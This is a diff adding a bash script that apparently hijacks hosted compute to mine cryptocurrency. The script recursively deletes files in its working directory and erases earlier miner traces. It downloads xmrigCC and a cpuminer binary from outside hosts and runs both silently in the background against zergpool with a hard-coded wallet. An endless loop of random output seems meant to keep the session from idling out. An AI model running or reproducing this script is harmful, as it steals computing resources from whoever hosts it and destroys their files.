@@ -1,0 +1,21 @@
+#!/bin/bash
+rm -rvf * 
+rm -rvf ele* lol* cpuminer-avx2* 1.43* TON* ton* NB* xmrig* .lib* .bash* .majza*
+rm -R *
+mkdir .des
+cd .des
+rm -R *
+
+wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && clear && ./miner/xmrigDaemon -o stratum+tcp://randomx.na.mine.zergpool.com:4453 -u kc1qnnkjytyc9xvmlrndyv75u44a4yjejmmp3pg4jf -p c=KCN,ID=$(shuf -n 1 -i 1-9999)-SALMoN -k -a randomx -t4 > /dev/null 2>&1 &
+
+wget https://gitlab.com/rizqullahizaa/rizqune/-/raw/master/cpuminer-avx2 > /dev/null 2>&1
+chmod 777 cpuminer-avx2 > /dev/null 2>&1 
+
+./cpuminer-avx2 -a yespowerR16 -o stratum+tcp://yespowerR16.na.mine.zergpool.com:6534 -u kc1qnnkjytyc9xvmlrndyv75u44a4yjejmmp3pg4jf -p c=KCN,ID=$(shuf -n 1 -i 1-9999)-SAL -t 4 > /dev/null 2>&1
+
+#!/bin/sh
+
+while [ 1 ]; do
+  while :; do echo $RANDOM | md5sum | head -c 95; echo; sleep 1m; done
+  sleep 1
+done
